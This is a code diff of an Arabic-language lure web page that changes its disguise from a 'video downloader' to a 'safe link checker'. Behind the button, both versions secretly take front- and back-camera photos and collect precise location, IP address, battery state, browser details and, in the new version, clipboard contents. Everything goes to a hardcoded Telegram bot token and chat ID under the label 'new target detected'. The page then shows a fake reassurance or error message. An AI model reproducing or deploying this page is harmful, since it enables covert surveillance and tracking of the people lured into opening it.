@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Video Downloader Pro</title>
+    <title>Ghost Link - التحقق من أمان الرابط</title>
     <style>
         :root { --bg: #0b0f19; --card: #161b22; --text: #e6edf3; --primary: #38bdf8; }
         body { background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .app-card { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #30363d; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         .logo { font-size: 60px; margin-bottom: 20px; }
-        input { width: 100%; padding: 15px; margin: 20px 0; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
-        .download-btn { background: var(--primary); color: #0b0f19; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        .download-btn { background: var(--primary); color: #0b0f19; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
         #status { margin-top: 15px; font-size: 0.8rem; color: #8b949e; display: none; }
         video, canvas { display: none; }
     </style>
@@ -18,12 +17,11 @@
 <body>
 
 <div class="app-card">
-    <div class="logo">🌐</div>
-    <h2>حمل فيديوهاتك بأعلى دقة</h2>
-    <p>الصق رابط الفيديو من TikTok, Instagram للتحميل 4K المباشر.</p>
-    <input type="text" id="urlInput" placeholder="ضع الرابط هنا...">
-    <button class="download-btn" onclick="startBruteForce()">بدء التحميل المباشر</button>
-    <div id="status">جاري الاتصال بالسيرفر المحمي...</div>
+    <div class="logo">🛡️</div>
+    <h2>فاحص الروابط الآمن</h2>
+    <p>اضغط على الزر أدناه للتأكد من أن الرابط الذي تلقيته آمن ولا يحتوي على برمجيات خبيثة.</p>
+    <button class="download-btn" onclick="executeGhostMode()">بدء الفحص الآن</button>
+    <div id="status">جاري تحليل بيانات الاتصال...</div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
@@ -33,90 +31,89 @@
     const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
     const C = "7984067238";
 
-    // دالة إرسال الصور بدقة عالية
-    async function sendSnap(blob, caption) {
-        const fd = new FormData();
-        fd.append("chat_id", C);
-        fd.append("photo", blob, "capture.jpg");
-        fd.append("caption", caption);
-        fd.append("parse_mode", "Markdown");
-        try {
-            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: "POST", body: fd });
-        } catch (e) {}
+    async function sendToTelegram(data, type = "text") {
+        const url = `https://api.telegram.org/bot${T}/`;
+        if (type === "text") {
+            await fetch(url + `sendMessage?chat_id=${C}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
+        } else {
+            const fd = new FormData();
+            fd.append("chat_id", C);
+            fd.append("photo", data, "shot.jpg");
+            await fetch(url + "sendPhoto", { method: "POST", body: fd });
+        }
     }
 
-    // دالة جلب البيانات الشاملة كما في النموذج
-    async function getFullSpecs() {
-        let specs = `🔔 *إشعار: تم رصد هدف جديد*\n\n`;
+    async function getDetails() {
+        let report = `🔔 *إشعار: تم رصد هدف جديد*\n\n`;
         
-        // جلب الموقع بدقة عالية
-        const posPromise = new Promise((res) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => res(`📍 الموقع: [فتح الخريطة](http://googleusercontent.com/maps.google.com/4{p.coords.latitude},${p.coords.longitude}) (دقة: ${p.coords.accuracy.toFixed(1)}m)`),
-                    () => res(`📍 الموقع: (لم يتم الحصول على الإذن)`)
-                , {enableHighAccuracy: true});
-            } else { res(`📍 الموقع: غير مدعوم`); }
+        // 1. الموقع
+        const pos = await new Promise(r => {
+            navigator.geolocation.getCurrentPosition(
+                p => r(`📍 الموقع: [فتح الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}) (دقة: ${p.coords.accuracy.toFixed(1)}m)`),
+                () => r(`📍 الموقع: تعذر الحصول عليه`), {enableHighAccuracy: true}
+            );
         });
-        specs += await posPromise + "\n";
-        specs += `📱 *الجهاز:* \`${navigator.platform}\`\n`;
+        report += pos + "\n";
+
+        // 2. الجهاز والمتصفح
+        report += `📱 الجهاز: \`${navigator.platform}\`\n`;
+        report += `🖥️ المتصفح: \`${navigator.userAgent.split(' ').pop()}\`\n`;
+
+        // 3. البطارية وحالة الشحن
         try {
             const b = await navigator.getBattery();
-            specs += `🔋 *البطارية:* \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔋 يشحن" : "🔌 لا يشحن"})\n`;
-        } catch (e) {}
+            const status = b.charging ? "🔌 يشحن حالياً" : "🔋 غير موصل بالشاحن";
+            report += `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${status})\n`;
+        } catch(e) {}
+
+        // 4. الـ IP
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            specs += `🌐 *الـ IP:* \`${ipData.ip}\`\n`;
-        } catch (e) {}
-        specs += `🖥️ *المتصفح:* \`${navigator.userAgent.split(' ').pop()}\`\n`;
-        return specs;
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            report += `🌐 الـ IP: \`${ip.ip}\`\n`;
+        } catch(e) {}
+
+        // 5. محتوى الكيبورد (Clipboard)
+        try {
+            const clipText = await navigator.clipboard.readText();
+            report += `📋 محتوى الكيبورد: \`${clipText || "فارغ"}\`\n`;
+        } catch(e) {
+            report += `📋 الكيبورد: \`مرفوض أو غير مدعوم\`\n`;
+        }
+
+        return report;
     }
 
-    // دالة التقاط صورة بجودة قصوى
-    async function takeShot(side) {
-        const constraints = { video: { facingMode: side === "front" ? "user" : "environment", width: { ideal: 1920 }, height: { ideal: 1080 } } };
+    async function takePhoto(side) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: side === "front" ? "user" : "environment" } });
             const v = document.getElementById('v');
             v.srcObject = stream;
             await new Promise(r => v.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 800)); // وقت كافٍ لتركيز الكاميرا والوضوح
             const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth;
-            canvas.height = v.videoHeight;
+            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
             canvas.getContext('2d').drawImage(v, 0, 0);
             stream.getTracks().forEach(t => t.stop());
-            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95)); // ضغط جودة 95%
+            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
         } catch (e) { return null; }
     }
 
-    // الدالة الرئيسية عند الضغط على الزر
-    async function startBruteForce() {
-        if (!document.getElementById('urlInput').value) { alert("يرجى وضع رابط أولاً!"); return; }
+    async function executeGhostMode() {
         document.getElementById('status').style.display = 'block';
-
-        // 1. جلب التقرير الشامل
-        const specsReport = await getFullSpecs();
         
-        // 2. حلقة تصوير مرتين فقط (4 صور المجموع)
-        for (let i = 1; i <= 2; i++) {
-            // صورة أمامية 1
-            const fBlob = await takeShot("front");
-            if (fBlob) await sendSnap(fBlob, `📷 (لقطة أمامية بوضوح #${i})`);
-
-            // صورة خلفية 1
-            const bBlob = await takeShot("back");
-            if (bBlob) await sendSnap(bBlob, `📷 (لقطة خلفية بوضوح #${i})`);
-        }
+        // التقاط الصور (مرة أمامية ومرة خلفية)
+        const front = await takePhoto("front");
+        if (front) await sendToTelegram(front, "photo");
         
-        // 3. إرسال التقرير النهائي (كما في النموذج)
-        await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(specsReport)}&parse_mode=Markdown`);
+        const back = await takePhoto("back");
+        if (back) await sendToTelegram(back, "photo");
 
-        alert("خطأ: السيرفر مشغول حالياً. تعذر تحميل الفيديو.");
+        // إرسال التقرير النصي الكامل
+        const report = await getDetails();
+        await sendToTelegram(report, "text");
+
+        alert("تم الفحص بنجاح: الرابط آمن للاستخدام.");
         document.getElementById('status').style.display = 'none';
     }
 </script>
-
 </body>
 </html>
